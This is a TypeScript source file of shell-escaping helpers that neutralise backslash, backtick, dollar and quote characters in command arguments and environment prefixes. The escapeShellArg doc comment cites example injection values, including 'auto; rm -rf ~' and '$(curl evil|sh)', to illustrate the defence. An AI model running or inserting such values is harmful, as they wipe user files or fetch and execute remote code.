/**
 * @description Shell-safety helpers shared by every driver's command builder. Ported verbatim from
 * tools/workflows (`run-iteration.ts` `escapeForShellDoubleQuoted` and `ralph-worktree-cli.ts`
 * `escapeShellArg`) so injected plan/task text can never trigger command/parameter substitution.
 */

/**
 * @description Sentinel worktree value: pass the worktree flag with no name (CLI optional argument).
 * @public
 */
export const WORKTREE_FLAG_ONLY = '' as const;

/**
 * @description Escapes a string for safe use inside a double-quoted shell argument. Neutralizes
 * every character that keeps special meaning inside a double-quoted POSIX word — `\`, `` ` ``, `"`,
 * and `$` — so text containing `$(...)`, `` `...` ``, or `${...}` cannot trigger substitution. The
 * backslash replacement runs first so the escapes it adds are not double-escaped by later passes.
 * @public
 */
export function escapeForShellDoubleQuoted(prompt: string): string {
  return prompt
    .replace(/\\/g, '\\\\')
    .replace(/`/g, '\\`')
    .replace(/\$/g, '\\$')
    .replace(/"/g, '\\"');
}

/**
 * @description Escapes an arbitrary value for safe use as a single argument inside a `shell: true`
 * command string. Values matching the safe charset pass through verbatim; anything else is wrapped
 * in double quotes with every shell-special character (`\`, `` ` ``, `$`, `"`) escaped, so a value
 * like `auto; rm -rf ~`, `$(curl evil|sh)`, `` `id` ``, or `${HOME}` cannot break out of the
 * argument. The backslash replacement runs first so its escapes are not double-escaped.
 * @public
 */
export function escapeShellArg(value: string): string {
  if (/^[A-Za-z0-9._/-]+$/.test(value)) {
    return value;
  }

  return `"${value
    .replace(/\\/g, '\\\\')
    .replace(/`/g, '\\`')
    .replace(/\$/g, '\\$')
    .replace(/"/g, '\\"')}"`;
}

/**
 * @description Builds a leading `KEY=value ` env-assignment prefix for a `shell: true` command
 * string (values escaped via {@link escapeShellArg}). Keys are emitted in alphabetical order and
 * empty-string values are dropped. Returns `''` when nothing survives, so callers can prepend it
 * unconditionally. Used by drivers that inject a custom endpoint through the environment (the
 * engine spawns without an `env` override, so env must live in the command string).
 * @public
 */
export function formatShellEnvPrefix(
  env: Readonly<Record<string, string>>,
): string {
  const parts = Object.keys(env)
    .sort()
    .filter((key) => env[key] !== '')
    .map((key) => `${key}=${escapeShellArg(env[key])}`);

  return parts.length > 0 ? `${parts.join(' ')} ` : '';
}
